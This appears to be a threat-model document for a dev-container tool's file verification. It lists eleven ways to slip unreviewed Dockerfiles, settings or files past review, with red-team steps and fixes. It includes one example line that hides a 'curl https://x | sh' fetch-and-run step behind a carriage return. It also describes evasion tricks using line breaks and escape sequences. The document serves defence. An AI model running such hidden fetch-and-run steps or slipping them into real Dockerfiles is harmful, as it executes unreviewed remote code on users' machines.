# Verification Attack Vectors

The weak points of [project verification](verification.md): how a project could get settings or files past the review, or keep using an acceptance it shouldn't.  Contributors should treat changes to the code listed here as security-sensitive, and the red team can use each vector as a starting point.  See the [attack vector overview](attack-vectors.md) for how to read the severity and status labels.

Verification is now the control that several other vectors depend on: [NET-2](network-attack-vectors.md#net-2-the-project-controls-the-allowlist), [BRIDGE-2](host-bridge-attack-vectors.md#bridge-2-the-project-chooses-the-commands) and [DEV-2](dev-container-attack-vectors.md#dev-2-mount-points-are-written-into-the-compose-env-file) are only as strong as it is.


## Attacker goals

* **Run unreviewed files**: get a changed `Dockerfile`, script or `dev-env.yaml` built without a new review.
* **Hide what's accepted**: get a setting accepted that the reviewer never saw, or saw as something else.
* **Stretch an acceptance**: use one beyond the files, the branch, the setup or the time it was given for.
* **Tamper with the store**: change what the run thinks you accepted.


## Attack surface

| Input | Controlled by | Handled in |
| --- | --- | --- |
| Files in `.surf-scoter.d` (project file, Dockerfiles, `dev-env.yaml`, build files) | The project, including changes pulled from others or brought back from the project clone | `take` and `canonical_hash` in [`snapshot.py`](../../scripts/surf_scoter_lib/verified/snapshot.py); [`lookup.py`](../../scripts/surf_scoter_lib/verified/lookup.py) |
| File names and contents shown in the review | The project | [`review.py`](../../scripts/surf_scoter_lib/review.py); [`checks.py`](../../scripts/surf_scoter_lib/checks.py) |
| The branch name | The project's VCS, and whoever names branches | `current_branch` in [`main_verify.py`](../../scripts/main_verify.py); [`exempt.py`](../../scripts/surf_scoter_lib/verified/exempt.py); [`records.py`](../../scripts/surf_scoter_lib/verified/records.py) |
| The verified store | You, and any process running as you | [`store.py`](../../scripts/surf_scoter_lib/verified/store.py); [`accepted.rs`](../../host/src/config/accepted.rs) |
| The setup | You | `setup_values` in [`records.py`](../../scripts/surf_scoter_lib/verified/records.py) |
| The distribution's scripts | Whoever installed them | [`scoter.py`](../../scoter.py) |


## Summary

| ID | Vector | Severity | Status |
| --- | --- | --- | --- |
| [VER-1](#ver-1-the-dockerfile-meaning-match-can-be-fooled) | The Dockerfile meaning match can be fooled | High | Open |
| [VER-2](#ver-2-any-file-named-dev-envyaml-matches-on-meaning) | Any file named `dev-env.yaml` matches on meaning | High | Open |
| [VER-3](#ver-3-the-review-doesnt-show-everything-it-accepts) | The review doesn't show everything it accepts | High | Open |
| [VER-4](#ver-4-exemptions-accept-what-nobody-reviewed) | Exemptions accept what nobody reviewed | High | By design, partly Open |
| [VER-5](#ver-5-branch-names-dont-agree) | Branch names don't agree | Medium | Open |
| [VER-6](#ver-6-setup-changes-that-dont-ask-for-a-new-review) | Setup changes that don't ask for a new review | Medium | Open |
| [VER-7](#ver-7-a-distribution-inside-a-project) | A distribution inside a project | Medium | Open |
| [VER-8](#ver-8-the-store-itself) | The store itself | Medium | Mitigated |
| [VER-9](#ver-9-trusted-containers) | Trusted containers | Medium | By design |
| [VER-10](#ver-10-project-text-printed-outside-the-review) | Project text printed outside the review | Low | Open |
| [VER-11](#ver-11-the-parse-and-the-snapshot-race) | The parse and the snapshot race | Low | Open |


## Vectors

### VER-1: The Dockerfile meaning match can be fooled

**Severity:** High.  **Status:** Open.
**Where:** `canonical_dockerfile` and `is_dockerfile` in [`snapshot.py`](../../scripts/surf_scoter_lib/verified/snapshot.py); the carry-forward in [`lookup.py`](../../scripts/surf_scoter_lib/verified/lookup.py); the Dockerfile listing in [`review.py`](../../scripts/surf_scoter_lib/review.py).

A Dockerfile that differs from the accepted one only in comments and blank lines matches on meaning, and the run carries the acceptance forward without asking.  That's only safe if the canonical form drops exactly what Docker ignores, and it doesn't:

* **Line breaks.**  `canonical_dockerfile` splits lines with Python's `str.splitlines()`, which also breaks on `\r`, `\v`, `\f`, `\x1c` to `\x1e`, `\x85`, U+2028 and U+2029.  Docker breaks lines only on `\n`.  So `RUN echo ok\r# ; curl https://x | sh` canonicalizes the same as `RUN echo ok`: Python sees a second, comment, line.  Docker sees one line, and the shell should see `ok\r#` as one word and run what follows.  The canonical forms were confirmed equal; that Docker and the shell then run the hidden part hasn't been tested.
* **Heredocs.**  A quoted heredoc delimiter containing a `-` (`<<"END-1"`) isn't recognized as one, so `#` lines inside the heredoc, which are part of the script, are dropped as comments.
* **Names.**  Any file named `Dockerfile.*` or `*.Dockerfile` gets the same treatment, so a script with such a name can change its `#!` line, or any `#` line, freely.

A pulled change using any of these is built without a review, outside the isolation ([DEV-3](dev-container-attack-vectors.md#dev-3-image-builds-run-outside-the-isolation)), and from then on it's what the stored acceptance holds.  The review shows a new Dockerfile with the same `splitlines()`, so even a reviewer reading it sees the hidden part as a separate comment line.

**Red team:** change an accepted Dockerfile using each of the line breaks above, a hyphenated heredoc delimiter, and a `Dockerfile.sh` script, and check whether `scoter run` asks for a review.  Confirm what Docker and BuildKit run.

**When changing this code:** split lines exactly as Docker does (`\n` only, with a trailing `\r` removed), or refuse a Dockerfile containing any other line-breaking or control character.  Recognize every delimiter form Docker accepts, or treat a heredoc that isn't understood as bytes only.  Limit the comment stripping to files the build actually reads as Dockerfiles.  Show the review with the same splitting.

### VER-2: Any file named `dev-env.yaml` matches on meaning

**Severity:** High.  **Status:** Open.
**Where:** `canonical_hash` in [`snapshot.py`](../../scripts/surf_scoter_lib/verified/snapshot.py).

Every file named `dev-env.yaml`, wherever it is in a container directory, gets the canonical hash of the merged dev container, whatever its bytes are.  Only the dev container's own `dev-env.yaml` (and its parents') feed that merge.  A file of the same name elsewhere, such as `env/files/dev-env.yaml` copied into the image, can change freely and still match on meaning, so it's carried forward without a review.

**Red team:** add `files/dev-env.yaml` to an accepted container directory, have the Dockerfile `COPY` and run it, then change its contents and check whether `scoter run` asks for a review.

**When changing this code:** give the parsed hash only to the `dev-env.yaml` files the generator actually read, by path, and hash every other file by its bytes.

### VER-3: The review doesn't show everything it accepts

**Severity:** High.  **Status:** Open.
**Where:** the container listing in [`review.py`](../../scripts/surf_scoter_lib/review.py); [`checks.py`](../../scripts/surf_scoter_lib/checks.py).

The review shows host commands, egress rules, and new Dockerfiles in full.  For any other new file, including `dev-env.yaml` and scripts the build runs, it shows only the name, size and a short hash.  Changed files get a diff of up to 200 lines, and those over 256 KiB or not UTF-8 get none.  The parsed dev container values aren't shown anywhere: `user`, `mounts`, `broker-bin`, the sshd settings, and the project file's `container: mounts: project-clone` and `vcs`.

Several of those values reach the host.  The mount points are written into the compose `.env` file, and `user` into `~/.ssh/config`; the generator now refuses any that could inject anything ([DEV-1](dev-container-attack-vectors.md#dev-1-user-is-written-into-the-ssh-configuration), [DEV-2](dev-container-attack-vectors.md#dev-2-mount-points-are-written-into-the-compose-env-file)), but a reviewer can still accept them without seeing them: where the clone and the persistent store appear in the container, and as which user it runs.  The checks don't look at them either, nor at `RUN` lines, `# syntax=` directives, script contents, or the parent images' tags ([DEV-15](dev-container-attack-vectors.md#dev-15-the-project-chooses-shared-image-tags)).

**Red team:** in a new project, put an unusual (but valid) mount point or `user` in the settings, and look for it in the review.

**When changing this code:** show the parsed dev container values and the project file's container settings in the review, as data, and validate them on the host as strictly as any other value written to a host file.

### VER-4: Exemptions accept what nobody reviewed

**Severity:** High.  **Status:** By design (the exemption hands out trust on purpose); Open for the gaps below.
**Where:** [`exempt.py`](../../scripts/surf_scoter_lib/verified/exempt.py); `adopt_accepted`, `stage` and `prepare` in [`staging.py`](../../scripts/surf_scoter_lib/verified/staging.py); `accept_with_exemption` in [`main_verify.py`](../../scripts/main_verify.py); [`accept.py`](../../scripts/surf_scoter_lib/verified/accept.py).

Within an exemption, runs build from the live container files, after only the link, special-file and `project-files` name checks.  That's the point of an exemption, but a `git pull` during one brings other people's container changes in unreviewed too.

`scoter verify --with-exemption` goes further: it accepts the project's whole current suggestion, including new host commands and egress rules, without showing it, as long as no check *refuses* anything.  A new command that no check covers, or that only warns, is accepted.  Then:

* The acceptance it makes gets the normal expiry (`expiry-days`, 30), not the exemption's end, so it stays usable after the exemption is over.
* Each branch keeps one acceptance, so the next review compares with this one, and shows what nobody looked at as "unchanged since you accepted it".
* `scoter exempt` can be run again to move the end, with no overall limit.

**Red team:** during an exemption, pull a change adding a host command that only warns, then run `scoter verify --with-exemption`.  End the exemption, and check whether `scoter run` still uses the command, and how the next review presents it.

**When changing this code:** cap an `exempted` acceptance's expiry at its exemption's end, and have the next review compare with the last acceptance a person reviewed.  Consider refusing new host commands or egress rules under `--with-exemption`, rather than only refused ones.

### VER-5: Branch names don't agree

**Severity:** Medium.  **Status:** Open.
**Where:** `current_branch` in [`main_verify.py`](../../scripts/main_verify.py); `start` in [`exempt.py`](../../scripts/surf_scoter_lib/verified/exempt.py); the exempt match in [`records.py`](../../scripts/surf_scoter_lib/verified/records.py); `project-branch` in [`system.rs`](../../host/src/config/system.rs).

`scoter verify` records an acceptance under the raw branch name, but the lookup and exemptions use the sanitized `scoter:project-branch`.  For a branch like `feature/x`, they don't agree, so `scoter exempt` can start from another branch's acceptance, and "one acceptance per branch" can keep two.  Sanitizing also makes different branches collide: `a/b` and `a-b` are the same branch to an exemption.  Without a branch the VCS can report (a detached head, or no VCS), an exemption holds on every branch.

**Red team:** accept on `main`, check out `feature/x`, and run `scoter exempt`; see which acceptance it uses.  Start an exemption on `a-b` and run on `a/b`.

**When changing this code:** use one form of the branch name everywhere, and make it unambiguous.  Treat "no branch" as its own branch, not as every branch.

### VER-6: Setup changes that don't ask for a new review

**Severity:** Medium.  **Status:** Open.
**Where:** `setup_values` in [`records.py`](../../scripts/surf_scoter_lib/verified/records.py); the gateway check in [`accepted.rs`](../../host/src/config/accepted.rs).

An acceptance records the setup values it was made under (the files directory and container search, the verified containers, the store, the VCS commands, the gateway's name and `write-config` command, and the host command checks), and a change to any of them asks for a new review.  Other settings the review depends on aren't recorded:

* the `project-files` and `egress-hosts` checks, the refused wildcards, and the public suffix lists: a new check, or a stronger one, doesn't apply to projects already accepted;
* the build, compose and other `docker` commands, and the compose file;
* `expiry-days`, which applies only to new acceptances.

Separately, the generator's own check of the accepted settings compares the accepted gateway with the setup's only when the acceptance names one.  The lookup's setup values cover a gateway change today, so this matters only if that comparison is ever dropped.

**Red team:** accept a project, then tighten a `project-files` or `egress-hosts` check that it fails, and see whether `scoter run` notices.

**When changing this code:** record a hash of every check list in the setup values, or re-run the checks on the accepted settings at each run.  Treat a missing gateway as a mismatch in `accepted.rs` too.

### VER-7: A distribution inside a project

**Severity:** Medium.  **Status:** Open.
**Where:** `require_global_dist_dir` and the sub-command dispatch in [`scoter.py`](../../scoter.py); the distribution check in [`system.rs`](../../host/src/config/system.rs).

`scoter` runs `main_<command>.py` from the distribution's `bin` directory, and reads the lists of commands that skip acceptance from there.  The generator refuses a `distribution-dir` inside the project when a setup file sets it, but not when it comes from `--distribution-dir` or from where `scoter` itself was found.  Running a `scoter` that lives inside a cloned repository, such as a built installer in Surf Scoter's own repository, trusts that repository's scripts, including the ones that check its acceptance.

**Red team:** in a project with a `.surf-scoter.d`, build or copy a distribution inside it, change its `subcmd-no-acceptance.txt` or a `main_*.py`, and run that `scoter` on the project.

**When changing this code:** apply the same outside-the-project check to the distribution directory however it's found.

### VER-8: The store itself

**Severity:** Medium.  **Status:** Mitigated on POSIX; Unverified on Windows.
**Where:** [`store.py`](../../scripts/surf_scoter_lib/verified/store.py); `exclusive_lock` in [`fileutil.py`](../../scripts/surf_scoter_lib/fileutil.py); the accepted file checks in [`accepted.rs`](../../host/src/config/accepted.rs).

The store holds what the run trusts.  Its directories are `0700` and its files `0600`; every read checks the owner and mode, opens without following symlinks, and limits the size.  Writes are atomic, under an operating system lock.  The generator refuses a store or state directory inside the project.  `scoter-host` checks the universal configuration file's owner and mode, and that its `accepted-settings` match the file in the store (see [BRIDGE-14](host-bridge-attack-vectors.md#bridge-14-the-bridge-trusts-the-universal-configuration-files-command-list) for what it doesn't check).  Nothing in the container can reach the store: it isn't mounted, and it isn't under the project clone.

On Windows there are no mode checks; the profile's access control lists are relied on.  `flock` on a network home directory may lock only against this computer.  Any program running as you can still change the store, as it can change anything else of yours.

**Red team:** replace a store file with a symlink, loosen a file's mode, or change a blob's contents, and check that the run refuses.  On Windows, check what another account can reach.  Look for a host command whose accepted arguments let it write into `~/.config/surf-scoter.d`.

**When changing this code:** keep every store read going through the checks, and never mount the store, or put it under the project clone.

### VER-9: Trusted containers

**Severity:** Medium.  **Status:** By design.
**Where:** `scoter: path-lists: dev-containers-search` and `verification: path-lists: verified-containers` in [`setup.yaml`](../../defaults/setup.yaml).

Containers found in `dev-containers-search` outside the project, by default the distribution's, aren't snapshotted or reviewed, and are built from where they are.  A project can build on them by name.  Anyone who can change those directories changes every project that uses them.  Adding a directory to `verified-containers` reviews and snapshots its containers like the project's.

**Red team:** with write access to the distribution's `containers` directory, change a container a project builds on, and check that nothing asks for a review.

**When changing this code:** never add a directory the project controls to `dev-containers-search`.  The default list's first entry, the project's own files directory, is safe only because it's inside the snapshot.

### VER-10: Project text printed outside the review

**Severity:** Low.  **Status:** Open.
**Where:** `_why_not_accepted` and the staging errors in [`main_run.py`](../../scripts/main_run.py); the exemption notice in [`scoter.py`](../../scoter.py); [`verified_find.py`](../../scripts/verified_find.py).

The review cleans everything the project wrote, but some messages outside it print project file names, or errors containing them, as they are.  Snapshot file names may contain control characters, so a file name can carry terminal escape sequences.

**Red team:** add a file whose name contains escape sequences to a container directory, and trigger the "files changed" message and a staging error.

**When changing this code:** pass every project-derived string through `review.clean()` before printing it.

### VER-11: The parse and the snapshot race

**Severity:** Low.  **Status:** Open.
**Where:** the generator run in [`scoter.py`](../../scoter.py); `find` in [`lookup.py`](../../scripts/surf_scoter_lib/verified/lookup.py).

The meaning hashes of the project file and `dev-env.yaml` come from the generator's parse, but the snapshot reads their bytes later.  Something that changes them in between, with the right timing, gets a carried acceptance for bytes that weren't the ones parsed.  The staging check (the generator re-run on the restored copy) catches most of this; the rest lasts one run, since the next lookup doesn't match.

**Red team:** change `dev-env.yaml` between the generator's parse and `find-acceptance`, and see what the run uses.

**When changing this code:** parse the same bytes that are snapshotted, for example by snapshotting first and running the generator on the snapshot.


## Sensitive code

* [`scripts/surf_scoter_lib/verified/`](../../scripts/surf_scoter_lib/verified/): the store, snapshots, matching, staging, exemptions.
* [`scripts/surf_scoter_lib/review.py`](../../scripts/surf_scoter_lib/review.py) and [`checks.py`](../../scripts/surf_scoter_lib/checks.py): what the review shows and flags.
* [`scripts/main_verify.py`](../../scripts/main_verify.py), [`main_exempt.py`](../../scripts/main_exempt.py) and [`main_run.py`](../../scripts/main_run.py): accepting, and using an acceptance.
* [`scoter.py`](../../scoter.py), [`subcmd-no-acceptance.txt`](../../scripts/subcmd-no-acceptance.txt) and [`subcmd-no-project.txt`](../../scripts/subcmd-no-project.txt): which commands load accepted settings.
* [`host/src/config/accepted.rs`](../../host/src/config/accepted.rs) and [`host/src/universal.rs`](../../host/src/universal.rs): the accepted settings in the universal configuration file.
* The `verification` section of [`defaults/setup.yaml`](../../defaults/setup.yaml).
